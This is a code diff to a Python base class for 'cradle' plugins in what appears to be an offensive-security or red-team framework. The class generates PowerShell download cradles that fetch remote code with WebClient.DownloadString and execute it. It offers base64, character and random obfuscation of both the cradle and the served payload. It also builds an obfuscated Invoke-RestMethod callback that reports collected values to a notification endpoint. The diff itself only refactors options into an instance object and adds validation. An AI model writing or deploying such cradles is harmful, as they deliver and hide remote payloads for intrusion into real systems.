@@ -2,7 +2,7 @@ import base64
 
 from abc import ABC, abstractmethod
 from typing import Any, Dict, List
-from core.endpoint_registry import EndpointRegistry
+from core.models import CradleInstance
 from core.obfuscate_getrandom import get_random_obfuscated_string as sgr
 
 class BaseCradlePlugin(ABC):
@@ -13,40 +13,31 @@ class BaseCradlePlugin(ABC):
     
     OPTIONS: Dict[str, Dict[str, Any]] = {
         "CONTENT_OBFUSCATION": {
-            "description": (
-                "Payload obfuscation applied by the core before serving: "
-                "none | base64 | char | getrandom"
-            ),
+            "description": "Payload obfuscation applied by the core before serving: none | base64 | char | getrandom",
             "default": "getrandom",
+            "restricted_to": ["none","base64","char","getrandom"]
         },
         "CRADLE_OBFUSCATION": {
-            "description": (
-                "Cradle command obfuscation applied by the core before serving: "
-                "none | base64 | char | getrandom"
-            ),
-            "default": "getrandom"
+            "description": "Cradle command obfuscation applied by the core before serving: none | base64 | char | getrandom",
+            "default": "getrandom",
+            "restricted_to": ["none","base64","char","getrandom"]
         },
         "NEXT_CRADLE": {
-            "description": {
-                "Next cradle to call when completed; set to UID or Index"
-            },
+            "description": "Next cradle to call when completed; set to UID or Index",
             "default": 0
         }
     }
 
-    def __init__(self):
-        self._endpoint_registry = None
-
-    def __init__(self, endpoint_registry: EndpointRegistry):
+    def __init__(self, endpoint_registry=None):
         self._endpoint_registry = endpoint_registry
     
     @abstractmethod
-    def generate(self, options: dict, obfuscated: bool = True) -> str:
+    def generate(self, inst: CradleInstance, obfuscated: bool = True) -> str:
         """Return the raw cradle payload as a string (no encoding applied)."""
         pass
 
-    def cradle_command(self, cradle_url: str, options: dict) -> str:
-        obs_cradle = options.get("CRADLE_OBFUSCATION","none").lower()
+    def cradle_command(self, inst: CradleInstance, cradle_url: str) -> str:
+        obs_cradle = inst.options.get("CRADLE_OBFUSCATION","none").lower()
         cradle = f".((New-Object System.Net.WebClient).DownloadString({cradle_url}));"
 
         if obs_cradle == "base64":
@@ -57,8 +48,8 @@ class BaseCradlePlugin(ABC):
             return f".({sgr(cradle)});"
         return f"{cradle}"
     
-    def notification_callback_snippet(self, header_var_dict: dict) -> str:
-        notification_channel = self._endpoint_registry.create_notification_channel_for(self.uid)
+    def notification_callback_snippet(self, inst: CradleInstance, header_var_dict: dict) -> str:
+        notification_channel = self._endpoint_registry.create_notification_channel_for(inst.uid)
         snippet = f"""
 $responseJson = @{{
 {"\n".join(f"\t{x} = {header_var_dict[x]} | Out-String" for x in header_var_dict.keys())}
@@ -68,16 +59,19 @@ Invoke-RestMethod -Uri "{self._endpoint_registry.get_cradle_command(notification
         return f".({sgr(snippet)});"
 
     
-    def validate(self, options: dict) -> List[str]:
+    def validate(self, inst: CradleInstance, options: dict) -> List[str]:
         errors = []
-        merged = self.get_options_with_defaults(options)
+        merged = self.get_options_with_defaults(inst)
         for name, spec in self.OPTIONS.items():
             if spec.get("required", False) and not merged.get(name, ""):
                 errors.append(f"Required option '{name}' is not set")
+            if spec.get("restricted_to", False) and not merged.get(name, "") in spec.get("restricted_to", []):
+                errors.append(f"'{name}' must be one of: {' | '.join(spec.get("restricted_to",[]))}")
         return errors
     
-    def get_options_with_defaults(self, options: dict) -> dict:
+    def get_options_with_defaults(self, inst: CradleInstance) -> dict:
         result = {}
+        options = inst.options
         for name, spec in self.OPTIONS.items():
             if name in options and options[name] != "":
                 result[name] = options[name]
